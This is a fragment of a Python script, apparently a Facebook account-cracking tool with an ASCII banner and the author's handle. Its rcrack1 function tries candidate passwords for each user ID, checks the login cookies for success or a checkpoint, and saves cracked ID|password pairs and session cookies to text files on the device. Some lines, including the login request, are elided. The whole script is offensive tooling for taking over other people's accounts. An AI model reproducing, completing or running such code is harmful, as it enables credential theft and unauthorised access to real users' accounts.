...
os.system("xdg-open https://github.com/Ariful Islam-IN ")
logo = ("""

     ___      .______       __   _______  __    __   __          __       _______. __          ___      .___  ___.    
    /   \     |   _  \     |  | |   ____||  |  |  | |  |        |  |     /       ||  |        /   \     |   \/   |    
   /  ^  \    |  |_)  |    |  | |  |__   |  |  |  | |  |        |  |    |   (----`|  |       /  ^  \    |  \  /  |    
  /  /_\  \   |      /     |  | |   __|  |  |  |  | |  |        |  |     \   \    |  |      /  /_\  \   |  |\/|  |    
 /  _____  \  |  |\  \----.|  | |  |     |  `--'  | |  `----.   |  | .----)   |   |  `----./  _____  \  |  |  |  |    
/__/     \__\ | _| `._____||__| |__|      \______/  |_______|   |__| |_______/    |_______/__/     \__\ |__|  |__|    
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mAriful Islam-CYBER™\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[Ariful Islam-OK🌻] {uid}|{ps}")
                print(f"\n[COOKIE🎁] : {coki}")
                open('/sdcard/-Ariful Islam-IN/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[Ariful Islam❌] {uid}|{ps}")
                open('/sdcard/Ariful Islam-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[Ariful Islam-CYBER💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
